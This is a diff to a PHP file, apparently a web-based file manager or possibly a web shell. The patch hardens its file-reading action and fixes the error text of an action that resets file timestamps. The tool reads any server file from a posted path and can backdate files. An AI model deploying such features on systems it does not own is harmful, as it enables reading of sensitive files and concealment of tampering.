@@ -924,14 +924,33 @@ if ($authenticated && isset($_POST['ajax_action'])) {
 
         case 'get_file_content':
             if (isset($_POST['path'])) {
+                // FIX: Clear file status cache. This can resolve issues in environments
+                // where file metadata might not be immediately consistent (e.g., WSL, network mounts),
+                // which could be a cause of failure on newer PHP versions.
+                clearstatcache();
+                
                 $filePath = realpath($_POST['path']);
+
                 if ($filePath && is_file($filePath) && is_readable($filePath)) {
                     $content = @file_get_contents($filePath);
                     if ($content === false) {
-                        $response['message'] = '[Error] Could not read file content: ' . htmlspecialchars($_POST['path']);
+                        $response['message'] = '[Error] Could not read file content. Check file permissions and server logs.';
                     } else {
-                        $sanitized_content = mb_convert_encoding($content, 'UTF-8', 'UTF-8');
-                        $response = ['status' => 'success', 'content' => $sanitized_content];
+                        $final_content = $content;
+                        // FIX: Ensure mbstring extension is available before using it to prevent fatal errors.
+                        if (function_exists('mb_convert_encoding')) {
+                            // This step ensures the content is valid UTF-8 for JSON encoding,
+                            // which prevents errors on the client side. It cleans up invalid byte sequences.
+                            $final_content = mb_convert_encoding($content, 'UTF-8', 'UTF-8');
+                        }
+                        
+                        // FIX: Final check to prevent json_encode failure which can happen with binary files
+                        // or very malformed strings even after the conversion attempt.
+                        if (json_encode(['test' => $final_content]) === false) {
+                            $response['message'] = '[Error] File content could not be encoded for display. It may be a binary file or have an unsupported encoding.';
+                        } else {
+                            $response = ['status' => 'success', 'content' => $final_content];
+                        }
                     }
                 } else {
                     $response['message'] = '[Error] File not found, not a file, or not readable: ' . htmlspecialchars($_POST['path']);
@@ -1135,7 +1154,7 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 if (!$path) {
                     $response['message'] = '[Error] Item not found: ' . htmlspecialchars($_POST['path']);
                 } elseif ($timestamp === false) {
-                    $response['message'] = '[Error] Invalid date/time format provided: ' . htmlspecialchars($_POST['datetime_str']) . '. Use<x_bin_342>-MM-DD HH:MM:SS.';
+                    $response['message'] = '[Error] Invalid date/time format provided: ' . htmlspecialchars($_POST['datetime_str']) . '. Use YYYY-MM-DD HH:MM:SS.';
                 } else {
                     if (@touch($path, $timestamp)) {
                         $response = ['status' => 'success', 'message' => 'Timestamp updated for ' . htmlspecialchars(basename($path)) . ' to ' . date("Y-m-d H:i:s", $timestamp)];
